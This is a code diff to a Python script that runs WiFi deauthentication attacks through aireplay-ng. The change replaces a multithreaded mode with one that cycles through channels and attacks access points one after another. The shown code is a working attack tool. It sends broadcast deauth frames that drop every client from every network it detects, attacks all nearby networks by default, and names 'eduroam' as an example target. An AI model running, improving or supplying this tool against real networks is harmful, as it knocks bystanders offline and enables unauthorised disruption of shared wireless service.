@@ -28,7 +28,6 @@ import os
 import time
 import re
 import pwd
-import threading
 #import pprint
 #import _thread
 
@@ -73,8 +72,7 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 	Send deauthentication packets to disconnect clients from an access point.
 	
 	This function uses aireplay-ng to send deauth packets to ALL clients connected
-	to the target AP using broadcast addressing. This is more effective than
-	targeting the AP alone. Thread-safe for concurrent attacks.
+	to the target AP using broadcast addressing (FF:FF:FF:FF:FF:FF).
 	
 	Args:
 		interface (str): The wireless interface in monitor mode
@@ -84,20 +82,21 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 		ap_essid (str): Network name (ESSID) of the target AP
 	
 	Returns:
-		None: Prints timing information about the attack duration
+		bool: True if successful, False if error occurred
 	"""
+	global current_channel
 	try:
-		thread_id = threading.current_thread().name
-		print(f"[{thread_id}] Deauthing {ap_essid} ({ap_mac}) on channel {ap_channel}")
+		# Hop to the correct channel if needed
+		if current_channel != ap_channel:
+			hop_channel(interface, ap_channel)
 		
-		# Record start time for performance measurement
-		date = datetime.datetime.now()
+		# Record start time
+		start = datetime.datetime.now()
 		
 		# Execute aireplay-ng deauth attack with broadcast client address
 		# -0 = deauth attack
 		# -a = AP MAC address (target access point)
 		# -c = Client MAC address (FF:FF:FF:FF:FF:FF = broadcast to ALL clients)
-		# This sends deauth frames that appear to come from the AP to all connected clients
 		cmd = ['aireplay-ng', '-0', str(num_pkts_to_send), '-a', ap_mac, '-c', 'FF:FF:FF:FF:FF:FF', interface]
 		
 		# Run attack
@@ -108,17 +107,16 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 		if process.returncode != 0:
 			err_msg = stderr.decode().strip() if stderr else "Unknown error"
 			if "ioctl" not in err_msg:  # Ignore ioctl warnings
-				print(f"[{thread_id}] ERROR: {err_msg}")
+				print(f"  ERROR: {err_msg}")
 				return False
 		
-		# Calculate and display how long the attack took
-		date2 = datetime.datetime.now()
-		duration = (date2 - date).total_seconds()
-		print(f"[{thread_id}] Completed in {duration:.1f}s")
+		# Calculate duration
+		duration = (datetime.datetime.now() - start).total_seconds()
+		print(f"  Completed in {duration:.1f}s ({num_pkts_to_send} packets sent)")
 		return True
 
 	except Exception as e:
-		print(f"[{threading.current_thread().name}] Exception: {e}")
+		print(f"  Exception: {e}")
 		return False
 
 def read_csv(directory, file_name):
@@ -245,51 +243,26 @@ def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_ess
 		return
 
 	if attack_all:
-		# Attack all detected APs simultaneously using threads
-		print(f"Attacking {len(my_list)} access point(s) SIMULTANEOUSLY...")
+		# Attack all detected APs sequentially (fast iteration)
+		# Cannot attack different channels simultaneously - hardware limitation
+		print(f"Attacking {len(my_list)} access point(s) sequentially...")
 		
 		# Sort by signal strength (strongest first)
 		my_list.sort(key=lambda x: x[3])
 		
-		# Limit simultaneous attacks to prevent resource exhaustion
-		max_concurrent = min(len(my_list), 20)  # Max 20 concurrent attacks
-		if len(my_list) > max_concurrent:
-			print(f"Note: Limiting to {max_concurrent} concurrent attacks (out of {len(my_list)} total)")
-		
-		# Create threads for each AP attack
-		threads = []
-		for idx, lst in enumerate(my_list[:max_concurrent], 1):
-			print(f"[{idx}/{max_concurrent}] Starting attack on {lst[2]} ({lst[0]})")
-			
-			# Create thread for this AP (daemon=False so they complete)
-			thread = threading.Thread(
-				target=deauth,
-				args=(interface, num_pkts_to_send, lst[0], lst[1], lst[2]),
-				daemon=False,
-				name=f"Deauth-{lst[2][:8]}"
-			)
-			threads.append(thread)
-			thread.start()
-			
-			# Small delay to prevent overwhelming the system
-			time.sleep(0.05)
-		
-		# Update LCD to show simultaneous attack
+		# Update LCD
 		if LCD_AVAILABLE:
-			display_status(f"Attacking {len(threads)}", "Simultaneously")
+			display_status(f"Attacking {len(my_list)}", "Sequentially")
 		
-		print(f"\nAll {len(threads)} attacks running!")
-		print("Waiting for attacks to complete...")
+		# Attack each AP in rapid succession
+		for idx, lst in enumerate(my_list, 1):
+			print(f"\n[{idx}/{len(my_list)}] Attacking {lst[2]} ({lst[0]})")
+			if LCD_AVAILABLE:
+				display_status(f"AP {idx}/{len(my_list)}", lst[2][:16])
+			
+			deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])
 		
-		# Wait for all threads to finish with timeout
-		for idx, thread in enumerate(threads, 1):
-			thread.join(timeout=60)  # 60 second timeout per thread
-			if thread.is_alive():
-				print(f"Warning: Thread {idx} still running after timeout")
-			else:
-				print(f"Thread {idx}/{len(threads)} completed")
-		
-		print("All attacks completed!")
+		print(f"\nCompleted attacks on all {len(my_list)} APs!")
 	else:
 		# Attack only the strongest AP
 		# Sort by power (index 3) - strongest signal has highest value (least negative)
@@ -453,8 +426,9 @@ if 'SUDO_USER' in os.environ:
 else:
     dump_dir = os.path.expanduser("~/dump")
 
-deauth_num_pkts = 500             # Number of deauth packets per AP (increased for effectiveness)
-                                   # 0 = continuous attack (use with caution)
+deauth_num_pkts = 100             # Number of deauth packets per AP
+                                   # Lower = faster cycling through multiple APs
+                                   # Higher = more aggressive per AP
 iface = "wlan1"                   # Wireless interface in monitor mode (usually external adapter)
 deauth_max_seconds = 30           # Time between scans (unused in current implementation)
                                    # Note: Could be used to refresh targets periodically
@@ -466,9 +440,10 @@ target_essid = None               # None = attack all networks found
                                    # Or set to "eduroam" for specific network
 
 # Attack Mode
-# Set to True to attack all found networks/APs simultaneously (using threads)
+# Set to True to attack all found networks/APs sequentially (fast iteration)
 # Set to False to attack only the strongest signal
-attack_all_found = True           # True = attack all simultaneously, False = strongest only
+# NOTE: Cannot attack networks on different channels simultaneously (hardware limitation)
+attack_all_found = True           # True = attack all in sequence, False = strongest only
 
 # ============================================================================
 # Initialization
@@ -552,12 +527,14 @@ if target_essid:
 else:
     print("Target Network: All networks")
 if attack_all_found:
-    print("Attack Mode: ALL access points SIMULTANEOUSLY")
-    print("             (Multi-threaded attack)")
+    print("Attack Mode: ALL access points SEQUENTIALLY")
+    print("             (Fast cycling through networks)")
 else:
     print("Attack Mode: Strongest signal only")
 print(f"Packets per AP: {deauth_num_pkts}")
 print(f"Broadcast Mode: Enabled (targeting all clients)")
+print("\nNOTE: WiFi card can only be on ONE channel at a time.")
+print("      Networks on different channels are attacked in sequence.")
 print("="*50 + "\n")
 
 # Test airodump-ng before starting main loop
